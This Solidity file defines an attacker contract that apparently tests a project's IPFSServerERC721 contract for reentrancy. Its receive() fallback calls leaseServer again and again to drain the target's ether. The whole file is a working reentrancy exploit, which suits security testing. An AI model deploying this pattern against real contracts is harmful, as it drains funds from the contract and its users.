// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

import "./IPFSServerERC721.sol";
import "./IERC721Receiver.sol";

contract IPFSServerERC721Attack_1 is IERC721Receiver{
    IPFSServerERC721 private _contract;

    constructor(address _ipfsServer721Address) {
        _contract = IPFSServerERC721(_ipfsServer721Address);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external
    override
    pure
    returns(bytes4) {
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }

    // Receive is called when the contract sends Ether to the attacker contract.
    receive() external payable {
        if (address(_contract).balance >= 1 ether) {
            leaseServer();
        }
    }

    function attack() external payable {
        mintServer();
        leaseServer();
    }

    function mintServer() internal {
        _contract.mintServer("uri", 1 ether);
    }

    function leaseServer() internal {
        _contract.leaseServer{value: 1 ether}(2, 0x6cc26f47a5f21a9669d57976dbdd6aa5d4159f7ca76984e44764266e3063999f);
    }
}
